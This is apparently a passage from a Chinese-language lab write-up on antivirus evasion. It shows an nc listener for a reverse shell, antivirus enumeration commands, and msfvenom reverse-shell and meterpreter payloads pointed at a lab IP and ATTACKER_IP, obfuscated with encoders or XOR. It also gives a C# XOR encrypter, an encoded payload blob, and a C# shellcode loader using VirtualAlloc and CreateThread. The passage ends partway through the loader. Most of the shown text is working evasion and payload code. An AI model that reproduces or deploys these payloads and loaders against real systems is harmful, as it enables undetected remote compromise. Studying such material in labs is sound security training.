#98C379">&quot;/C=XX/ST=StateName/L=CityName/O=CompanyName/OU=CompanySectionName/CN=CommonNameOrHostname&quot;</span></span><span class="line"></span><span class="line"><span style="color: #61AFEF">//</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">启动</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">HTTPS</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">服务器</span></span><span class="line"><span style="color: #61AFEF">python3</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-c</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;from http.server import HTTPServer, SimpleHTTPRequestHandler; import ssl; host, port = &quot;0.0.0.0&quot;, 443; httpd = HTTPServer((host, port), SimpleHTTPRequestHandler); context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); context.load_cert_chain(certfile=&quot;cert.pem&quot;, keyfile=&quot;key.pem&quot;); httpd.socket = context.wrap_socket(httpd.socket, server_side=True); print(f&quot;HTTPS server running on https://{host}:{port}/&quot;); httpd.serve_forever()&#39;</span></span><span class="line"></span><span class="line"><span style="color: #61AFEF">//</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">接收反向</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">shell</span></span><span class="line"><span style="color: #61AFEF">nc</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-lvp</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">7474</span></span></code></pre></div></div></figure><p>注意这里用的是 <code>SimpleHTTPRequestHandler</code> ，他支持文件共享。</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">wmic</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">namespace</span><span style="color: #ABB2BF">:\\</span><span style="color: #E06C75">root</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">securitycenter2</span><span style="color: #ABB2BF"> path antivirusproduct</span><span style="color: #C678DD"> GET </span><span style="color: #ABB2BF">displayName,</span><span style="color: #E06C75">productState</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> pathToSignedProductExe</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">tasklist</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">svc</span><span style="color: #ABB2BF"> | findstr Def</span></span><span class="line"><span style="color: #E06C75">tasklist</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">svc</span><span style="color: #ABB2BF"> | findstr Virus</span></span></code></pre></div></div></figure><h2 id="绕过杀软手段"><a href="#绕过杀软手段" class="headerlink" title="绕过杀软手段"></a>绕过杀软手段</h2><h3 id="编码和加密"><a href="#编码和加密" class="headerlink" title="编码和加密"></a>编码和加密</h3><p>把 shellcode 编码或者是直接用加密算法把 shellcode 加密，再在 loader 里面解密之后写入内存，这样能避免直接检查出 shellcode 的明文，绕过静态检测，不过有些杀软也有解密的功能</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 显示可用的编码器</span></span><span class="line"><span style="color: #61AFEF">msfvenom</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">--list</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">encoders</span><span style="color: #ABB2BF"> | </span><span style="color: #61AFEF">grep</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">excellent</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># -e encoder</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># -i 迭代次数</span></span><span class="line"><span style="color: #61AFEF">msfvenom</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-a</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">x86</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">--platform</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Windows</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LHOST=</span><span style="color: #D19A66">10.11</span><span style="color: #98C379">.141.2</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LPORT=</span><span style="color: #D19A66">443</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows/shell_reverse_tcp</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-e</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">x86/shikata_ga_nai</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-b</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;\x00&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-i</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">3</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">exe</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-o</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">enc_shell.exe</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 显示可用的加密方式</span></span><span class="line"><span style="color: #61AFEF">msfvenom</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">--list</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">encrypt</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 使用 xor 加密</span></span><span class="line"><span style="color: #61AFEF">msfvenom</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows/x64/meterpreter/reverse_tcp</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LHOST=ATTACKER_IP</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LPORT=</span><span style="color: #D19A66">7788</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">exe</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">--encrypt</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">xor</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">--encrypt-key</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;MyZekr3tKey***&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-o</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">xored-revshell.exe</span></span></code></pre></div></div></figure><h4 id="创建自己的编码器"><a href="#创建自己的编码器" class="headerlink" title="创建自己的编码器"></a>创建自己的编码器</h4><p>因为 MSF 创建的可以被检测到，所以我们要用自己的方式去处理。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 创建一个 chsarp 格式的 shell 马</span></span><span class="line"><span style="color: #61AFEF">msfvenom</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LHOST=</span><span style="color: #D19A66">10.11</span><span style="color: #98C379">.141.2</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LPORT=</span><span style="color: #D19A66">4444</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows/x64/shell_reverse_tcp</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">csharp</span></span></code></pre></div></div></figure><p>房间这里提供了一个加密器：</p><figure class="shiki csharp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Collections</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Generic</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Linq</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Text</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Threading</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Tasks</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">namespace</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Encrypter</span></span><span class="line"><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">internal</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">class</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Program</span></span><span class="line"><span style="color: #ABB2BF">    {</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[] </span><span style="color: #61AFEF">xor</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[] </span><span style="color: #E5C07B">shell</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[] </span><span style="color: #E5C07B">KeyBytes</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">        {</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">for</span><span style="color: #ABB2BF"> (</span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">i</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">; </span><span style="color: #E06C75">i</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">&lt;</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">shell</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Length</span><span style="color: #ABB2BF">; </span><span style="color: #E06C75">i</span><span style="color: #56B6C2">++</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">            {</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">shell</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">i</span><span style="color: #ABB2BF">] </span><span style="color: #C678DD">^=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">KeyBytes</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">i</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">%</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">KeyBytes</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Length</span><span style="color: #ABB2BF">];</span></span><span class="line"><span style="color: #ABB2BF">            }</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">shell</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">        }</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">void</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Main</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">string</span><span style="color: #ABB2BF">[] </span><span style="color: #E5C07B">args</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">        {</span></span><span class="line"><span style="color: #7F848E; font-style: italic">            //XOR Key - It has to be the same in the Droppr for Decrypting</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">string</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">key</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;THMK3y123!&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">            //Convert Key into bytes</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75">keyBytes</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Encoding</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">ASCII</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">GetBytes</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">key</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">            //Original Shellcode here (csharp format)</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75">buf</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> new </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">460</span><span style="color: #ABB2BF">] { </span><span style="color: #D19A66">0xfc</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">0x48</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">0x83</span><span style="color: #ABB2BF">,..,</span><span style="color: #D19A66">0xda</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">0xff</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">0xd5</span><span style="color: #ABB2BF"> };</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">            //XORing byte by byte and saving into a new array of bytes</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75">encoded</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">xor</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">buf</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">keyBytes</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">Console</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">WriteLine</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Convert</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">ToBase64String</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">encoded</span><span style="color: #ABB2BF">));        </span></span><span class="line"><span style="color: #ABB2BF">        }</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>生成出来 Base64 编码好的字符</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">qADOr8OR8TIzIRUZDBthKGd6AvMxAMYZUzG6YCtp3xptA7gLYXo8lh4CAHr6MQDynx01NE9nEzjw+z5gVYmvpmE4YHq4c3TDD3d7eOG5s6lUSE0DtrlFVXsghBjGAys9unITaFWYrh17hvhzuBXcAEydfkj4egLh+AmMgj44MPMLwSG5AUh/XTl3CvAhkBUPuDkVezLxMgnGR3s9unIvaFWYDMA38Xkz42AMCRUVaiNwanJ4FRIFyN9ZcGDMwQwJFBF78iPbZN6rtxACjQ5CAGwSZkhNCmUwuNR7oLjoTEszMLjXep1WSFwXOXK8MHJ1HcGpB7qIcIh/VnJPsp5/8NtaMiBUSBQKiVCxWTPegRgdBgKwfAPzaauIBcLxMc7ye6iVCfehPKbRzeZp3Y8nW3IhfbvRad2xDPGq3EVTzPQcyYkLMXkxe4tCOSxNSzN5MXNjYAQAxKlkLmZ/AuE+RRQKY5vNVPRlcBxMSnv0dRYr51QgBcLVL2FzY2AECR0CzLlwYnrenAXEin/w8HOJWJh3y7TmMQDge96ew0MKiXG2L1PegfO9/pEvcIiVtOnVsp57+vUaDycoQs2w0ww0iXQyJicnS2o4uOjM9A==</span></span></code></pre></div></div></figure><p>现在我们有了编码好的 payload，所以我们需要一个可以<strong>解码</strong>我们 payload 的<strong>加载器</strong>，这个加载器用 NET8.0 编译会报错，直接用 csc 编译就行。</p><figure class="shiki csharp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Net</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Text</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">InteropServices</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">class</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Program</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF">  [</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;kernel32&quot;</span><span style="color: #ABB2BF">)]</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">VirtualAlloc</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpStartAddr</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">size</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">flAllocationType</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">flProtect</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">  [</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;kernel32&quot;</span><span style="color: #ABB2BF">)]</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateThread</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpThreadAttributes</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">dwStackSize</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpStartAddress</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">param</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">dwCreationFlags</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">ref</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpThreadId</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">  [</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;kernel32&quot;</span><span style="color: #ABB2BF">)]</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">WaitForSingleObject</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">hHandle</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">dwMilliseconds</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">MEM_COMMIT</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0x1000</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">PAGE_EXECUTE_READWRITE</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0x40</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">  </span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[] </span><span style="color: #61AFEF">xor</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[] </span><span style="color: #E5C07B">shell</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[] </span><span style="color: #E5C07B">KeyBytes</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">        {</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">for</span><span style="color: #ABB2BF"> (</span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">i</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">; </span><span style="color: #E06C75">i</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">&lt;</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">shell</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Length</span><span style="color: #ABB2BF">; </span><span style="color: #E06C75">i</span><span style="color: #56B6C2">++</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">            {</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">shell</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">i</span><span style="color: #ABB2BF">] </span><span style="color: #C678DD">^=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">KeyBytes</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">i</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">%</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">KeyBytes</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Length</span><span style="color: #ABB2BF">];</span></span><span class="line"><span style="color: #ABB2BF">            }</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">shell</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">        }</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">void</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Main</span><span style="color: #ABB2BF">()</span></span><span class="line"><span style="color: #ABB2BF">  {</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">string</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">dataBS64</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75">data</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Convert</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">FromBase64String</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">dataBS64</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">string</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">key</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;THMK3y123!&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    //Convert Key into bytes</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75">keyBytes</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Encoding</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">ASCII</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">GetBytes</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">key</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75">encoded</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">xor</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">data</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">keyBytes</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    